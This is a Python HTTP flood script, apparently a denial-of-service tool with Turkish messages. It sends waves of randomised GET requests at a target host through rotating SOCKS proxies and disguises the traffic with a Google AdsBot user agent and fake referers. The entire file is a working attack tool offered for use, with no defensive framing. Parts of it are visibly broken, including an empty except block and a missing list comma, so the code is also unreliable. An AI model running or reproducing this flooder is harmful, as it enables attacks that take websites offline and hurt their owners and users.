#!/usr/bin/env python
# -*- coding: utf-8 -*-
from threading import Thread
import sys
import time
import random
import string
import socket
import socks
import ssl
import requests

url = sys.argv[1]
port = int(sys.argv[2])
skt = int(sys.argv[3])
cnt = int(sys.argv[4])
file = sys.argv[5]

cookies = 'bgfrtddd'
setsocks = socks.setdefaultproxy
Choice = random.choice
Intn = random.randint

strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
]

#host_url = url.replace("http://", "").replace("https://", "").split('/')[0]

with open(file) as p:
    USER_PROXY = [line.strip() for line in p]

def randomIp():
  random.seed()
  result = str(Intn(1, 254)) + '.' + str(Intn(1, 254)) + '.'
  result = result + str(Intn(1, 254)) + '.' + str(Intn(1, 254))
  return result

def randomurl():
	 return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))

def cc(sockstype,port,cnt):
	while True:
		url2 = '/'
		connection = "Connection: Keep-Alive\r\n"
		if cookies != "":
			connection += "Cookies: "+str(cookies)+"\r\n"
		accept = Choice(acceptall)
		referer = "Referer: "+Choice(referers)+ url + url2 + "\r\n"
		#useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
		useragent = "User-Agent: " + "AdsBot-Google (+http://www.google.com/adsbot.html)" + "\r\n"
		forward = "X-Forwarded-For: " + randomIp() + "\r\n"
		proxy = Choice(USER_PROXY).replace("http://", "").strip().split(":")
		try:
			if sockstype == 4:
				setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
			if sockstype == 5:
				setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
		except:
			proxy = Choice(USER_PROXY).strip().split(":")
		s = socks.socksocket()
		#s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
		try:
			s.connect((str(url), int(port)))
			if port == 443:
				try:
					ctx = ssl.SSLContext()
					s = ctx.wrap_socket(s,server_hostname=url)
					#print ('ssl tamam')
				except:
					#print ('ssl olmadi')
			try:
				for _ in range(cnt):
					get_host = "GET " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + url + "\r\n"
					#request = get_host + referer + useragent + accept + forward + connection +"\r\n"
					request = get_host + referer + useragent + accept + connection +"\r\n"
					s.send(str.encode(request))
				s.close()
				print ('[*] flood | '+str(proxy[0])+':'+str(proxy[1]))
			except:
				s.close()
				print ('vuramadi')
		except:
			print ('Proxy Hatasi.')
			#pass

for i in range(cnt):
  try:  
    t = Thread(target = cc, args = (skt,port,cnt,))
    t.daemon = True
    t.start()
    time.sleep(0.003)
    print ('Program: ' + str(i) + ' Basladi.')
  except:
    print ('consol acilisinda hata')
while True:
	time.sleep(1)